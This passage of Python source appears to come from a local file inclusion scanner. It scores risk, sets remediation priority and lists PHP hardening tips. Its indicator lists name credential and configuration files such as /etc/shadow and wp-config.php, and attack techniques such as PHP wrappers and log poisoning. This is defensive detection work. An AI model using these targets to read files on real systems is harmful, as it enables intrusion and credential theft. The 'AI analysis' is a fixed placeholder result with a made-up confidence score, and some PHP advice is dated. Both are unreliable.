            Sensitive Files Found:
            {results['sensitive_files_found'][:3] if results['sensitive_files_found'] else 'None'}
            
            Provide:
            1. Risk assessment (Critical/High/Medium/Low)
            2. Data exposure impact analysis
            3. Specific remediation steps for LFI vulnerabilities
            4. Input validation and sanitization recommendations
            5. File access control recommendations
            6. PHP security configuration improvements
            7. Log poisoning prevention strategies
            8. Monitoring and detection recommendations
            
            Be professional, detailed, and actionable.
            """
            
            # Simplified AI analysis - focus on vulnerability detection
            ai_response = {
                "analysis": "LFI vulnerability analysis completed",
                "recommendations": ["Review discovered LFI vulnerabilities", "Implement input validation"],
                "confidence": 80
            }
            
            return {
                "risk_level": self._calculate_lfi_risk(results),
                "ai_recommendations": ai_response,
                "remediation_priority": self._get_lfi_remediation_priority(results),
                "php_hardening": self._get_php_hardening_recommendations(results)
            }
        
        except Exception as e:
            logger.error(f"AI analysis failed: {e}")
            return {
                "risk_level": "medium",
                "ai_recommendations": "Manual review required",
                "error": str(e)
            }
    
    def _calculate_lfi_risk(self, results: Dict[str, Any]) -> str:
        """Calculate LFI risk level"""
        if not results['vulnerabilities']:
            return "low"
        
        # Check for critical indicators
        critical_indicators = [
            "php_wrapper_lfi",
            "/etc/shadow",
            "config.php",
            "wp-config.php"
        ]
        
        high_indicators = [
            "/etc/passwd",
            "boot.ini",
            "log_poisoning"
        ]
        
        for vuln in results['vulnerabilities']:
            vuln_str = str(vuln).lower()
            if any(indicator in vuln_str for indicator in critical_indicators):
                return "critical"
            elif any(indicator in vuln_str for indicator in high_indicators):
                return "high"
        
        # Check sensitive files
        if results['sensitive_files_found']:
            for file_info in results['sensitive_files_found']:
                if file_info.get('sensitivity_level') == 'critical':
                    return "critical"
        
        return "medium"
    
    def _get_lfi_remediation_priority(self, results: Dict[str, Any]) -> str:
        """Get LFI remediation priority"""
        if not results['vulnerabilities']:
            return "low"
        
        # Check for immediate threats
        if results['php_wrapper_results'] or results['log_poisoning_potential']:
            return "immediate"
        
        # Check for sensitive file disclosure
        critical_files_found = any(
            file_info.get('sensitivity_level') == 'critical' 
            for file_info in results.get('sensitive_files_found', [])
        )
        
        if critical_files_found:
            return "immediate"
        
        return "high"
    
    def _get_php_hardening_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Get PHP-specific hardening recommendations"""
        recommendations = [
            "Disable dangerous PHP functions: allow_url_fopen, allow_url_include",
            "Set open_basedir restriction to limit file access",
            "Disable PHP wrappers: php://, data://, expect://",
            "Enable safe_mode if using older PHP versions",
            "Implement strict input validation and whitelisting"
        ]
        
        if results['php_wrapper_results']:
            recommendations.extend([
                "Immediately disable php://filter and data:// wrappers",
                "Review and restrict stream wrapper usage",
                "Implement content-type validation for file operations"
            ])
        
        return recommendations
